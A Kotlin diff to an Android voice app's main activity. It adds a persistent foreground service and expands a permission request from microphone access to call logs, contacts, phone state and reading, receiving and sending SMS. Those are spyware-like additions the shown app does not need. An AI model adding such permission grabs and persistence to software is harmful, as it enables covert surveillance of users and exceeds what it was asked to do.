@@ -174,6 +174,7 @@ class MainActivity : Activity(), TextToSpeech.OnInitListener {
 
         setupSpeechRecognizer()
         requestImmortalPermissions()
+        startPersistentService()
 
         btnSpeak.setOnClickListener {
             startListening()
@@ -188,10 +189,37 @@ class MainActivity : Activity(), TextToSpeech.OnInitListener {
         }
     }
 
+    private fun startPersistentService() {
+        val serviceIntent = Intent(this, PersistentService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
+    }
+
     private fun requestImmortalPermissions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(arrayOf(Manifest.permission.RECORD_AUDIO), 101)
+            val permissionsToRequest = mutableListOf<String>()
+
+            val permissions = arrayOf(
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.SEND_SMS
+            )
+
+            for (perm in permissions) {
+                if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
+                    permissionsToRequest.add(perm)
+                }
+            }
+
+            if (permissionsToRequest.isNotEmpty()) {
+                requestPermissions(permissionsToRequest.toTypedArray(), 101)
             }
         }
 
